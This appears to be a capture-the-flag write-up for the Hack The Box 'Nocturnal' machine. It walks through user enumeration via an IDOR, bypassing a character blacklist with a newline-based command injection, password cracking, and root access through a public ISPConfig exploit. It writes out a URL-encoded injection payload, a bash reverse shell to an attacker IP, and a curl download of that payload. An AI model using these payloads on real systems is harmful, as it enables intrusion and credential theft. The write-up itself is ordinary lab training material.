---
slug: /write-up/htb/machines/easy/nocturnal
pagination_next: null
pagination_prev: null
---

# Nocturnal

## Enumeration

nmap:

```bash
└─$ nmap 10.10.11.64
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 20:56 CEST
Nmap scan report for 10.10.11.64
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```

Whatweb:

```bash
whatweb nocturnal.htb                                                                                        
http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
```

Discovering folders with fuff, we found that `nginx` is returning 403 or 301 for the following folders:

- backups
- uploads
- uploads2

This might be useful for later.

In the website we see: `Please login or register to start uploading and viewing your files.`

When you upload a file, you can see the URL is:

`http://nocturnal.htb/view.php?username=test%40test.htb&file=test.pdf`

We can try to abuse this to list files.

`Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`

If you register two users and upload different files, and you try to access same file from both accounts, you will discover that, i you send a valid username but invalid file, you'll get a list of the files uploaded for that username, e.g:

`http://nocturnal.htb/view.php?username=test@test.htb&file=test2.pdf`

So, we need a way of enumerating users. We can enumerate users with `fuff` and `SecLists`:

```bash
ffuf -w /opt/github/SecLists/Usernames/Names/names.txt:FUFF -u "http://nocturnal.htb/view.php?username=FUFF&file=test.pdf" -H "Cookie: PHPSESSID=xxx" -fw 1170
```

Take into account that we need to be authenticated to perform the IDOR (Insecure Direct Object Reference) attack. To simulate authentication, we can pass a cookie to fuff. The following users have been found:

```
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 33ms]
kevin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]
```

Amanda has a file named `privacy.odt`. The password for amanda is in that file. Trying to ssh to the machine with amanda user and password failed; but we can access the website and have access to the admin panel.

## Foothold

Now we have access to the source code and we have a form to create and access backups. We see there are two folders: `uploads` and `backups` shown in the Admin panel. The admin panel only shows php files, but if we create a backup we'll have access to the uploads content.

The URL format of the backup is `http://nocturnal.htb/backups/backup_2025-08-17.zip`. We can try to bruteforce the backup folder and see if we find something interesting. Nothing found ...

However, checking the code of the create backup function, a potential command injection is found via the password file

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

However, the password input is cleaned:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

After messing around, I found a way to bypass the cleaning function: use newline character to execute different commands, e.g:

```bash
ls
id
```

Newline character is not cleaned up from the user input. Since we have access to the source code, we can prepare an experiment to see if we can bypass the limitation with `\n`:

```php
$entry="1\nid>/tmp\n";
$password = cleanEntry($entry);
```

Since we want to retrieve the output of the `id` command, we need to force an error. In the legitimate command, stdout and stderr are redirected to a log:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

The only thing now missing is testing it via the UI. However, due to the nature of the HTML components, looks like the password is not sent to the PHP endpoint as we want. Instead, we can rely to manual execution with curl.

If we try to send `\n` char our command injection will fail, however, we can send the url-encoded version of the payload:

```
password=1%0Aid>/tmp%0A&backup=
```

In the same way, we can leverage `\t` instead of ` `.

And we will see the contents of the id command in the returned logs.

Now, we can try to create a reverse shell abusing of this RCE. Since there are a lot of restrictions on the command injection, we'll build the reverse shell payload locally and upload it to the target.

1. Go to revshells.com
2. Write the reverse shell to a file in the attacker machine
```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.173/9001 0>&1"' > payload
```
3. Download the payload in the victim machine. Pass the command injection with a payload that will execute:
```bash
curl 10.10.14.173:8000/shell -o payload
```
This will download the payload to same directory
4. Check if the payload has been downloaded:
```bash
ls -l payload
```
5. Execute the payload:
```bash
bash payload
```

And we'll have a very nice shell into the machine with user `www-data`.

## Lateral movement

An SQLite database is found with www-data ownership. Let's exfiltrate it.

In the database there's a bunch of users/hashes. According to hashcat, they are md4 hashes.

Let's crack them:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

And we find the password for user `tobias`.

We can now connect and retrieve the user flag.

## Privilege escalation

There's a bunch of application listening in localhost:
```shell
tobias@nocturnal:~$ netstat -putona
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                    off (0.00/0/0)
```

In port 8080, it's something called ISPConfig. More info here: https://en.wikipedia.org/wiki/ISPConfig

Tried a SSH port forwarding the application complained about a possible attack. Most likely, there's something that checks the hostname. We can modify /etc/hosts in our attacker machine to tell that nocturnal.htb now points to localhost.

We can log in as admin - the password cracked for tobias.

Trying to determine the version of the running ISPConfig.

Come across some vulnerabilities:

- https://github.com/ajdumanhug/CVE-2023-46818

It will exploit versions of ISPConfig <= 3.2.11 and we've got ISPConfig Version: 3.2.10p1

We are lucky, looks like it will be affected

The poc will give us access to a `ispconfig-shell` as root. Looks like we cannot escape current directory, but, we can run a reverse shell from there that will give us full root access and we will be able to retrieve the flag.